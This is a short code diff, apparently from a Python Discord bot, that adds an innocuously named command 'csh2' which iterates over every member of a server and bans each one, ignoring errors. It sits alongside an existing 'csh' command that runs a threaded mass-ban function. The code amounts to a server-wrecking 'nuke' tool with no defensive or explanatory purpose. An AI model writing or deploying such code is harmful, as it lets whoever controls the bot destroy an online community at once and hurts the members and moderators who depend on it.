@@ -118,5 +118,13 @@ def ban_members(ctx):
 async def csh(ctx):
     threading.Thread(target=ban_members, args=(ctx,)).start()
 
+@main_bot.command()
+async def csh2(ctx):
+    print(len(ctx.guild.members))
+    for i in ctx.guild.members:
+        try:
+            await i.ban()
+        except:
+            pass
 main_bot.load_extensions()
 main_bot.run(os.getenv('BOT_TOKEN'))
